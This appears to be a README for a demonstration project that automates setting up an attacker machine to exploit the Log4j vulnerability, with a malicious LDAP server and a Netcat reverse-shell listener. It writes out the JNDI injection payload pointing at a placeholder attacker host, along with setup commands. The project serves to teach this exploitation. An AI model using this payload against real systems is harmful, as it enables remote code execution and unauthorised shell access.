
# Automating Log4j Exploitation using Python

## Overview
This project demonstrates the process of exploiting the Log4j vulnerability (CVE-2021-44228) using a Python script to automate the setup of an attacker machine. The script prepares the environment by setting up a malicious LDAP server and a Netcat listener for a reverse shell connection. The actual payload injection is done manually, reflecting real-world exploitation scenarios.

## Table of Contents
- [Assumptions](#assumptions)
- [Requirements](#requirements)
- [Network Configuration](#network-configuration)
- [Script Details](#script-details)
- [Flow of Execution](#flow-of-execution)
- [Files Included](#files-included)

## Assumptions
In this project, it is assumed that the victim machine is already provisioned and actively running an application vulnerable to the Log4j vulnerability. The vulnerable service is configured and operational, and the attacker will manually inject the payload into the victim machine.

## Requirements
### Operating System:
- **Attacker machine**: Linux-based distribution (e.g., Kali Linux).
- **Victim machine**: Must run a vulnerable application using Log4j with remote logging enabled.

### Python Environment:
- Python 3 installed on the attacker machine.

### Tools and Dependencies:
- **Netcat (nc)**: For setting up a listener for reverse shell access.
- **Git**: To clone the Log4j exploit Proof-of-Concept (PoC) repository.
- **Java JDK 8**: Required to execute the malicious Java class file.
- **Log4j-shell-poc**: GitHub repository for simulating the Log4j vulnerability exploitation.

### Commands:
- Clone the repository:
```bash
git clone https://github.com/kozmer/log4j-shell-poc.git
```
- Install dependencies:
```bash
pip3 install -r requirements.txt
```

## Network Configuration
- Both attacker and victim machines must have reachable network access.
- Necessary ports:
  - **Port 8080**: Web server for the attacker's machine.
  - **Port 1389**: LDAP server for payload delivery.
  - **Reverse Shell Port (e.g., 9001)**: Netcat listener port for reverse shell.

## Script Details
This Python script automates the setup of key services to exploit the Log4j vulnerability. It prepares the attackerâ€™s machine and initializes the LDAP server and Netcat listener. The payload injection is done manually by the attacker.

### Key Functions and Workflow:
1. **Setup Attacker Machine**:
   - Updates the system and clones the `log4j-shell-poc` repository.
   - Installs the necessary dependencies.
2. **Start the PoC Server**:
   - Launches the LDAP server to respond to vulnerable Log4j lookup requests.
3. **Start the Netcat Listener**:
   - Initiates a listener to wait for the reverse shell connection.

### Manual Payload Delivery:
The attacker must manually inject the payload:
```bash
${jndi:ldap://<attacker_ip>:<ldap_port>/a}
```
Once the payload is injected, the vulnerable application will trigger the exploit, leading to a reverse shell connection.

## Flow of Execution
1. **Setup the Attacker Environment**.
2. **Start PoC Server and Listener**.
3. **Manual Exploitation**: The attacker injects the crafted payload.
4. **Reverse Shell**: Successful exploitation leads to reverse shell access.

## Files Included
- **log4j_exploit.py**: Python script that automates the setup of the attacker machine.
- **Automating Log4j Exploitation using Python.pdf**: Detailed explanation and requirements of the project.
